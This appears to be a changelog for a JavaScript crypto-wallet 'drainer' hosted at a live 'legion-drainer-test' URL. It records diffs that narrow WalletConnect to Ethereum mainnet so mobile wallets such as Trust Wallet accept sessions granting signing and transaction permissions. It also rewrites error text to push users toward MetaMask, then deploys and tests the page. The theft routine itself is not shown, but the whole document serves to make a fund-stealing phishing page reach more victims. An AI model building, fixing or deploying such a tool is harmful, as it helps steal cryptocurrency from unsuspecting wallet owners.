# WalletConnect — Ethereum Mainnet Only Fix

**Live URL:** https://legion-drainer-test.surge.sh  
**Deployed:** 2026-06-13

## Problem
Trust Wallet and other mobile wallets rejected sessions because `connectWalletConnect()` required multiple EVM chains + Solana (`"Some of the required chains are not supported yet."`).

## Code Changes (`scripts/legion-one-script.js`)

### 1. Chain constants — mainnet only
```diff
- var WC_EVM_CHAINS = ['eip155:1', 'eip155:137', ...];
- var WC_SOLANA = 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp';
+ var WC_EVM_MAINNET = 'eip155:1';
+ var WC_CONNECT_FAIL_MSG = 'WalletConnect connection failed – your wallet may not support the required network. Please use MetaMask or another EVM wallet.';
```

### 2. `connectWalletConnect()` — single required namespace
```diff
  await provider.connect({
    namespaces: {
      eip155: {
        methods: ['eth_signTypedData_v4', 'eth_sendTransaction', ...],
-       chains: WC_EVM_CHAINS,
+       chains: [WC_EVM_MAINNET],
        events: ['accountsChanged', 'chainChanged'],
      },
-     solana: { ... },
    },
  });
```

### 3. Error handling
```diff
+ function isWcUnsupportedChainsError(msg) {
+   return /not supported|unsupported chain|required chains/i.test(msg);
+ }
  catch (e) {
    if (/reject|cancel|closed|declined/i.test(msg)) throw new Error('WalletConnect cancelled');
+   if (isWcUnsupportedChainsError(msg)) throw new Error(WC_CONNECT_FAIL_MSG);
+   throw new Error(WC_CONNECT_FAIL_MSG);
  }
```

### 4. Session apply — EVM only (removed Solana WC path)
`applyWalletConnectSession()` now only reads `eip155` accounts.

### 5. UI copy
WC tab hint updated to: "Ethereum mainnet only. Scan QR with Trust Wallet or MetaMask Mobile."

`wcProjectId` and `--wcm-z-index: 2147483647` unchanged.

## Deploy
```bash
cd scripts && surge . legion-drainer-test.surge.sh
```
✅ Published successfully.

## Test
Hard refresh → ⬡ → WalletConnect → QR modal → connect Trust Wallet on Ethereum mainnet.
